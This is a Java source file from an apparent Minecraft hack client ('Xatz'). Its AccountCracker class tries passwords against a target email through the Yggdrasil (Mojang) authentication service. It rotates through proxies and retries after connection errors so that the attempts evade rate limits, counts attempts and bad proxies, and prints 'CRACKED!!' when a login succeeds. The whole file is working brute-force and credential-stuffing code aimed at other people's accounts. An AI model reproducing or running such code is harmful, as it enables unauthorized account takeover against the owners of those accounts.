package me.xatzdevelopments.xatz.cracker;

import java.io.IOException;
import java.net.Proxy;
import java.net.SocketException;
import java.util.NoSuchElementException;

import org.mcupdater.Yggdrasil.AuthManager;
import org.mcupdater.Yggdrasil.ErrorResponse;

import com.google.gson.JsonSyntaxException;

import me.xatzdevelopments.xatz.client.main.Xatz;

public class AccountCracker {

	private String email;
	private AuthManager authManager;

	public AccountCracker() {
		authManager = new AuthManager();
	}

	public boolean tryAccount(String password) {
		if (password == null) {
			System.err.println("Password null");
			return false;
		}
		if (email == null) {
			System.err.println("Email null");
			return false;
		}
		if (password.length() < 6) {
			System.err.println("Password too short!");
			return false;
		}
		return auth(email, password, Xatz.getCrackManager().nextProxy());
	}

	public boolean auth(String email, String pass, Proxy proxy) {
		try {
			if (Xatz.getCrackManager().stop) {
				return false;
			}
			System.out.println("Requesting: " + email + ":" + pass);
			String response = authManager.authenticate(email, pass, "", proxy);
			try {
				Xatz.getCrackManager().tries++;
				ErrorResponse errorResponse = (ErrorResponse) this.authManager.getGson().fromJson(response,
						ErrorResponse.class);
				String errorMessage = errorResponse.getErrorMessage();

				if (errorMessage == null || errorMessage.length() == 0) {
					System.out.println("CRACKED!!");
					return true;
				} else {
					System.err.println(errorMessage);
					return false;
				}

			} catch (JsonSyntaxException ignored) {
				// ignored.printStackTrace();
			}
			return true;
		} catch (SocketException e) {
			Xatz.getCrackManager().badProxies++;

			return auth(email, pass, Xatz.getCrackManager().nextProxy());
		} catch (IOException e) {
			Xatz.getCrackManager().badProxies++;

			return auth(email, pass, Xatz.getCrackManager().nextProxy());
		} catch (NoSuchElementException e) {
			Xatz.getCrackManager().badProxies++;

			return auth(email, pass, Xatz.getCrackManager().nextProxy());
		}
	}

	public void setEmail(String email) {
		this.email = email;
	}

	public String getEmail() {
		return email;
	}
}
